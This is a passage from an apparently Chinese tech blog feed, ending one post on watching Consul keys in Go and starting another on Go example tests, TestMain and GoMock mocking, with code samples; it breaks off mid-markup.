wp,<br>      lastValues: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]<span class="hljs-type">byte</span>),<br>      err:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, <span class="hljs-number">1</span>),<br>   &#125;, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newServiceWatcher</span><span class="hljs-params">(serviceName <span class="hljs-type">string</span>)</span></span> (*watcher, <span class="hljs-type">error</span>) &#123;<br>   wp, err := watch.Parse(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;<span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;service&quot;</span>, <span class="hljs-string">&quot;service&quot;</span>: serviceName&#125;)<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>   &#125;<br>   <span class="hljs-keyword">return</span> &amp;watcher&#123;<br>      Plan:       wp,<br>      lastValues: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]<span class="hljs-type">byte</span>),<br>      err:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, <span class="hljs-number">1</span>),<br>   &#125;, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-keyword">type</span> watcher <span class="hljs-keyword">struct</span> &#123;<br>   sync.RWMutex<br>   *watch.Plan<br>   lastValues    <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]<span class="hljs-type">byte</span><br>   hybridHandler watch.HybridHandlerFunc  <span class="hljs-comment">// 当对于路径发生变化时，调用相应函数</span><br>   stopChan      <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>   err           <span class="hljs-keyword">chan</span> <span class="hljs-type">error</span><br>&#125;<br><br><span class="hljs-comment">//获取value</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(w *watcher)</span></span> getValue(path <span class="hljs-type">string</span>) []<span class="hljs-type">byte</span> &#123;<br>   w.RLock()<br>   <span class="hljs-keyword">defer</span> w.RUnlock()<br><br>   <span class="hljs-keyword">return</span> w.lastValues[path]<br>&#125;<br><br><span class="hljs-comment">//更新value</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(w *watcher)</span></span> updateValue(path <span class="hljs-type">string</span>, value []<span class="hljs-type">byte</span>) &#123;<br>   w.Lock()<br>   <span class="hljs-keyword">defer</span> w.Unlock()<br><br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) == <span class="hljs-number">0</span> &#123;<br>      <span class="hljs-built_in">delete</span>(w.lastValues, path)<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      w.lastValues[path] = value<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//用于设置对应的处理函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(w *watcher)</span></span> setHybridHandler(prefix <span class="hljs-type">string</span>, handler <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*KV)</span></span>) &#123;<br>   w.hybridHandler = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(bp watch.BlockingParamVal, data <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>      kvPairs := data.(api.KVPairs)<br>      ret := &amp;KV&#123;&#125;<br><br>      <span class="hljs-keyword">for</span> _, k := <span class="hljs-keyword">range</span> kvPairs &#123;<br>         path := strings.TrimSuffix(strings.TrimPrefix(k.Key, prefix+<span class="hljs-string">&quot;/&quot;</span>), <span class="hljs-string">&quot;/&quot;</span>)<br>         v := w.getValue(path)<br><br>         <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(k.Value) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">len</span>(v) == <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-keyword">continue</span><br>         &#125;<br><br>         <span class="hljs-keyword">if</span> bytes.Equal(k.Value, v) &#123;<br>            <span class="hljs-keyword">continue</span><br>         &#125;<br><br>         ret.value = k.Value<br>         ret.key = path<br>         w.updateValue(path, k.Value)<br>         handler(ret)<br>      &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//运行watcher机制</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(w *watcher)</span></span> run(address <span class="hljs-type">string</span>, conf *api.Config) <span class="hljs-type">error</span> &#123;<br>   w.stopChan = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br>   w.Plan.HybridHandler = w.hybridHandler<br><br>   <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>      w.err &lt;- w.RunWithConfig(address, conf)<br>   &#125;()<br><br>   <span class="hljs-keyword">select</span> &#123;<br>   <span class="hljs-keyword">case</span> err := &lt;-w.err:<br>      <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;run fail: %w&quot;</span>, err)<br>   <span class="hljs-keyword">case</span> &lt;-w.stopChan:<br>      w.Stop()<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>   &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(w *watcher)</span></span> stop() &#123;<br>   <span class="hljs-built_in">close</span>(w.stopChan)<br>&#125;<br></code></pre></td></tr></table></figure><p>3.main.go，初始化consul配置信息后，实现对test路径下的Key进行监听；</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs stata">package main<br><br>import (<br><span class="hljs-string">&quot;github.com/longpi1/consul-tool/internal/backends&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;os/signal&quot;</span><br><span class="hljs-string">&quot;syscall&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br>func main() &#123;<br><span class="hljs-comment">// 初始化consul配置信息</span><br><span class="hljs-keyword">cli</span> := backends.NewConfig(backends.WithPrefix(<span class="hljs-string">&quot;kvTest&quot;</span>))<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">err</span> := <span class="hljs-keyword">cli</span>.Init(); <span class="hljs-keyword">err</span> != nil &#123;<br><span class="hljs-keyword">log</span>.Fatalln(<span class="hljs-keyword">err</span>)<br>&#125;<br><span class="hljs-comment">//监听consul中的key： test</span><br><span class="hljs-keyword">err</span> := <span class="hljs-keyword">cli</span>.Watch(<span class="hljs-string">&quot;test&quot;</span>, func(r *backends.KV) &#123;<br><span class="hljs-keyword">log</span>.Printf(<span class="hljs-string">&quot;该key： %s 已经更新&quot;</span>, r.Key())<br>&#125;)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">err</span> != nil &#123;<br><span class="hljs-keyword">log</span>.Fatalln(<span class="hljs-keyword">err</span>)<br>&#125;<br><span class="hljs-comment">//插入key</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">err</span> := <span class="hljs-keyword">cli</span>.Put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>); <span class="hljs-keyword">err</span> != nil &#123;<br><span class="hljs-keyword">log</span>.Fatalln(<span class="hljs-keyword">err</span>)<br>&#125;<br><span class="hljs-comment">//读取key</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">ret</span> := <span class="hljs-keyword">cli</span>.<span class="hljs-built_in">Get</span>(<span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-keyword">ret</span>.<span class="hljs-keyword">Err</span>() != nil &#123;<br><span class="hljs-keyword">log</span>.Fatalln(<span class="hljs-keyword">ret</span>.<span class="hljs-keyword">Err</span>())<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>println(<span class="hljs-keyword">ret</span>.Value())<br>&#125;<br><br>c := make(chan os.Signal, 1)<br><span class="hljs-comment">// 监听退出相关的syscall</span><br>signal.Notify(c, syscall.SIGHUP, syscall.SIGQUIT, syscall.SIGTERM, syscall.SIGINT)<br><span class="hljs-keyword">for</span> &#123;<br>s := &lt;-c<br><span class="hljs-keyword">log</span>.Printf(<span class="hljs-string">&quot;exit with signal %s&quot;</span>, s.<span class="hljs-built_in">String</span>())<br>switch s &#123;<br>case syscall.SIGQUIT, syscall.SIGTERM, syscall.SIGINT:<br><span class="hljs-comment">//停止监听对应的路径</span><br><span class="hljs-keyword">cli</span>.StopWatch(<span class="hljs-string">&quot;test&quot;</span>)<br>time.<span class="hljs-keyword">Sleep</span>(time.Second * 2)<br><span class="hljs-keyword">close</span>(c)<br><span class="hljs-keyword">return</span><br>case syscall.SIGHUP:<br>default:<br><span class="hljs-keyword">close</span>(c)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li>JackBai233，<a href="https://juejin.cn/post/6984378158347157512">使用Consul的watch机制监控注册的服务变化</a></li><li>风车，<a href="https://zhuanlan.zhihu.com/p/111673886">深入Consul Watch功能</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>consul</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
      <tag>consul</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 代码测试（下）：深入 Go 单元测试类型及项目测试实战</title>
    <link href="/2022/11/30/Go%E4%BB%A3%E7%A0%81%E6%B5%8B%E8%AF%95%EF%BC%88%E4%B8%8B%EF%BC%89%EF%BC%9A%E6%B7%B1%E5%85%A5Go%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E7%B1%BB%E5%9E%8B%E5%8F%8A%E9%A1%B9%E7%9B%AE%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98/"/>
    <url>/2022/11/30/Go%E4%BB%A3%E7%A0%81%E6%B5%8B%E8%AF%95%EF%BC%88%E4%B8%8B%EF%BC%89%EF%BC%9A%E6%B7%B1%E5%85%A5Go%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E7%B1%BB%E5%9E%8B%E5%8F%8A%E9%A1%B9%E7%9B%AE%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"># Go 代码测试（下）：深入Go 单元测试类型及项目测试实战<blockquote><p>本文章主要内容引用自：1.孔令飞，<a href="https://time.geekbang.org/column/article/410205">Go 语言项目开发实战</a>  </p></blockquote><p>这一篇文章将主要介绍Go 语言中的其他测试类型：<strong>示例测试、TestMain函数、Mock测试、Fake测试</strong>等，并且介绍下IAM项目是如何编写和运行测试用例的。</p><h2 id="示例测试"><a href="#示例测试" class="headerlink" title="示例测试"></a>示例测试</h2><p>示例测试以 <code>Example</code> 开头，没有输入和返回参数，通常保存在 <code>example_test.go</code> 文件中。示例测试可能包含以 <code>Output:</code> 或者 <code>Unordered output:</code> 开头的注释，这些注释放在函数的结尾部分。 <code>Unordered output:</code> 开头的注释会忽略输出行的顺序。</p><p>执行 <code>go test</code> 命令时，会执行这些示例测试，并且go test会将示例测试输出到标准输出的内容，跟注释作对比（比较时将忽略行前后的空格）。如果相等，则示例测试通过测试；如果不相等，则示例测试不通过测试。下面是一个示例测试（位于example_test.go文件中）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ExampleMax</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(Max(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))<br>    <span class="hljs-comment">// Output:</span><br>    <span class="hljs-comment">// 2</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行go test命令，测试 <code>ExampleMax</code> 示例测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -v -run=<span class="hljs-string">&#x27;Example.*&#x27;</span><br>=== RUN   ExampleMax<br>--- PASS: ExampleMax (0.00s)<br>PASS<br>ok      github.com/marmotedu/gopractise-demo/31/test    0.004s<br><br></code></pre></td></tr></table></figure><p>可以看到 <code>ExampleMax</code> 测试通过。这里测试通过是因为 <code>fmt.Println(Max(1, 2))</code> 向标准输出输出了 <code>2</code>，跟 <code>// Output:</code> 后面的 <code>2</code> 一致。</p><p>当示例测试不包含 <code>Output:</code> 或者 <code>Unordered output:</code> 注释时，执行 <code>go test</code> 只会编译这些函数，但不会执行这些函数。</p><h3 id="示例测试命名规范"><a href="#示例测试命名规范" class="headerlink" title="示例测试命名规范"></a>示例测试命名规范</h3><p>示例测试需要遵循一些命名规范，因为只有这样，Godoc才能将示例测试和包级别的标识符进行关联。例如，有以下示例测试（位于example_test.go文件中）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> stringutil_test<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br><br>    <span class="hljs-string">&quot;github.com/golang/example/stringutil&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ExampleReverse</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(stringutil.Reverse(<span class="hljs-string">&quot;hello&quot;</span>))<br>    <span class="hljs-comment">// Output: olleh</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>Godoc将在 <code>Reverse</code> 函数的文档旁边提供此示例，如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/d8/93/d8ae5e99fe1d159e9b3ba1f815b24693.png?wh=540x374" alt="img"></p><p>示例测试名以 <code>Example</code> 开头，后面可以不跟任何字符串，也可以跟函数名、类型名或者 <code>类型_方法名</code>，中间用下划线 <code>_</code> 连接，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Example</span><span class="hljs-params">()</span></span> &#123; ... &#125; <span class="hljs-comment">// 代表了整个包的示例</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ExampleF</span><span class="hljs-params">()</span></span> &#123; ... &#125; <span class="hljs-comment">// 函数F的示例</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ExampleT</span><span class="hljs-params">()</span></span> &#123; ... &#125; <span class="hljs-comment">// 类型T的示例</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ExampleT_M</span><span class="hljs-params">()</span></span> &#123; ... &#125; <span class="hljs-comment">// 方法T_M的示例</span><br><br></code></pre></td></tr></table></figure><p>当某个函数&#x2F;类型&#x2F;方法有多个示例测试时，可以通过后缀来区分，后缀必须以小写字母开头，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ExampleReverse</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ExampleReverse_second</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ExampleReverse_third</span><span class="hljs-params">()</span></span><br><br></code></pre></td></tr></table></figure><h3 id="大型示例"><a href="#大型示例" class="headerlink" title="大型示例"></a>大型示例</h3><p>有时候，我们需要编写一个大型的示例测试，这时候我们可以编写一个整文件的示例（whole file example），它有这几个特点：文件名以 <code>_test.go</code> 结尾；只包含一个示例测试，文件中没有单元测试函数和性能测试函数；至少包含一个包级别的声明；当展示这类示例测试时，godoc会直接展示整个文件。例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> sort_test<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;sort&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>    Name <span class="hljs-type">string</span><br>    Age  <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> String() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">&quot;%s: %d&quot;</span>, p.Name, p.Age)<br>&#125;<br><br><span class="hljs-comment">// ByAge implements sort.Interface for []Person based on</span><br><span class="hljs-comment">// the Age field.</span><br><span class="hljs-keyword">type</span> ByAge []Person<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a ByAge)</span></span> Len() <span class="hljs-type">int</span>           &#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(a) &#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a ByAge)</span></span> Swap(i, j <span class="hljs-type">int</span>)      &#123; a[i], a[j] = a[j], a[i] &#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a ByAge)</span></span> Less(i, j <span class="hljs-type">int</span>) <span class="hljs-type">bool</span> &#123; <span class="hljs-keyword">return</span> a[i].Age &lt; a[j].Age &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Example</span><span class="hljs-params">()</span></span> &#123;<br>    people := []Person&#123;<br>        &#123;<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-number">31</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-number">42</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Michael&quot;</span>, <span class="hljs-number">17</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Jenny&quot;</span>, <span class="hljs-number">26</span>&#125;,<br>    &#125;<br><br>    fmt.Println(people)<br>    sort.Sort(ByAge(people))<br>    fmt.Println(people)<br><br>    <span class="hljs-comment">// Output:</span><br>    <span class="hljs-comment">// [Bob: 31 John: 42 Michael: 17 Jenny: 26]</span><br>    <span class="hljs-comment">// [Michael: 17 Jenny: 26 Bob: 31 John: 42]</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>一个包可以包含多个whole file example，一个示例一个文件，例如 <code>example_interface_test.go</code>、 <code>example_keys_test.go</code>、 <code>example_search_test.go</code> 等。</p><h2 id="TestMain函数"><a href="#TestMain函数" class="headerlink" title="TestMain函数"></a>TestMain函数</h2><p>有时候，我们在做测试的时候，可能会在测试之前做些准备工作，例如创建数据库连接等；在测试之后做些清理工作，例如关闭数据库连接、清理测试文件等。这时，我们可以在 <code>_test.go</code> 文件中添加 <code>TestMain</code> 函数，其入参为 <code>*testing.M</code>。</p><p><code>TestMain</code> 是一个特殊的函数（相当于main函数），测试用例在执行时，会先执行 <code>TestMain</code> 函数，然后可以在 <code>TestMain</code> 中调用 <code>m.Run()</code> 函数执行普通的测试函数。在 <code>m.Run()</code> 函数前面我们可以编写准备逻辑，在 <code>m.Run()</code> 后面我们可以编写清理逻辑。</p><p>我们在示例测试文件 <a href="https://github.com/marmotedu/gopractise-demo/blob/master/test/math_test.go">math_test.go</a> 中添加如下TestMain函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMain</span><span class="hljs-params">(m *testing.M)</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;do some setup&quot;</span>)<br>    m.Run()<br>    fmt.Println(<span class="hljs-string">&quot;do some cleanup&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行go test，输出如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -v<br><span class="hljs-keyword">do</span> some setup<br>=== RUN   TestAbs<br>--- PASS: TestAbs (0.00s)<br>...<br>=== RUN   ExampleMax<br>--- PASS: ExampleMax (0.00s)<br>PASS<br><span class="hljs-keyword">do</span> some cleanup<br>ok  github.com/marmotedu/gopractise-demo/31/test0.006s<br><br></code></pre></td></tr></table></figure><p>在执行测试用例之前，打印了 <code>do some setup</code>，在测试用例运行完成之后，打印了 <code>do some cleanup</code>。</p><p>IAM项目的测试用例中，使用TestMain函数在执行测试用例前连接了一个fake数据库，代码如下（位于 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/service/v1/user_test.go">internal&#x2F;apiserver&#x2F;service&#x2F;v1&#x2F;user_test.go</a> 文件中）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMain</span><span class="hljs-params">(m *testing.M)</span></span> &#123;<br>    fakeStore, _ := fake.NewFakeStore()<br>    store.SetClient(fakeStore)<br>    os.Exit(m.Run())<br>&#125;<br><br></code></pre></td></tr></table></figure><p>单元测试、性能测试、示例测试、TestMain函数是go test支持的测试类型。此外，为了测试在函数内使用了Go Interface的函数，我们还延伸出了Mock测试和Fake测试两种测试类型。</p><h2 id="Mock测试"><a href="#Mock测试" class="headerlink" title="Mock测试"></a>Mock测试</h2><p>一般来说，单元测试中是不允许有外部依赖的，那么也就是说，这些外部依赖都需要被模拟。在Go中，一般会借助各类Mock工具来模拟一些依赖。</p><p>GoMock是由Golang官方开发维护的测试框架，实现了较为完整的基于interface的Mock功能，能够与Golang内置的testing包良好集成，也能用于其他的测试环境中。GoMock测试框架包含了GoMock包和mockgen工具两部分，其中GoMock包用来完成对象生命周期的管理，mockgen工具用来生成interface对应的Mock类源文件。下面，我来分别详细介绍下GoMock包和mockgen工具，以及它们的使用方法。</p><h3 id="安装GoMock"><a href="#安装GoMock" class="headerlink" title="安装GoMock"></a>安装GoMock</h3><p>要使用GoMock，首先需要安装GoMock包和mockgen工具，安装方法如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go get github.com/golang/mock/gomock<br>$ go install github.com/golang/mock/mockgen<br><br></code></pre></td></tr></table></figure><p>下面，我通过一个 <strong>获取当前Golang最新版本的例子</strong>，来给你演示下如何使用GoMock。示例代码目录结构如下（目录下的代码见 <a href="https://github.com/marmotedu/gopractise-demo/tree/master/gomock">gomock</a>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">tree .<br>.<br>├── go_version.go<br>├── main.go<br>└── spider<br>    └── spider.go<br><br></code></pre></td></tr></table></figure><p><code>spider.go</code> 文件中定义了一个 <code>Spider</code> 接口， <code>spider.go</code> 代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> spider<br><br><span class="hljs-keyword">type</span> Spider <span class="hljs-keyword">interface</span> &#123;<br>    GetBody() <span class="hljs-type">string</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>Spider</code> 接口中的GetBody方法可以抓取 <code>https://golang.org</code> 首页的 <code>Build version</code> 字段，来获取Golang的最新版本。</p><p>我们在 <code>go_version.go</code> 文件中，调用 <code>Spider</code> 接口的 <code>GetBody</code> 方法， <code>go_version.go</code> 代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> gomock<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;github.com/marmotedu/gopractise-demo/gomock/spider&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetGoVersion</span><span class="hljs-params">(s spider.Spider)</span></span> <span class="hljs-type">string</span> &#123;<br>    body := s.GetBody()<br>    <span class="hljs-keyword">return</span> body<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>GetGoVersion</code> 函数直接返回表示版本的字符串。正常情况下，我们会写出如下的单元测试代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestGetGoVersion</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    v := GetGoVersion(spider.CreateGoVersionSpider())<br>    <span class="hljs-keyword">if</span> v != <span class="hljs-string">&quot;go1.8.3&quot;</span> &#123;<br>        t.Error(<span class="hljs-string">&quot;Get wrong version %s&quot;</span>, v)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上面的测试代码，依赖 <code>spider.CreateGoVersionSpider()</code> 返回一个实现了 <code>Spider</code> 接口的实例（爬虫）。但很多时候， <code>spider.CreateGoVersionSpider()</code> 爬虫可能还没有实现，或者在单元测试环境下不能运行（比如，在单元测试环境中连接数据库），这时候 <code>TestGetGoVersion</code> 测试用例就无法执行。</p><p>那么，如何才能在这种情况下运行 <code>TestGetGoVersion</code> 测试用例呢？这时候，我们就可以通过Mock工具，Mock一个爬虫实例。接下来我讲讲具体操作。</p><p>首先，用 GoMock 提供的mockgen工具，生成要 Mock 的接口的实现，我们在gomock目录下执行以下命令：</p><figure class="highlight bash"><table><tr><td 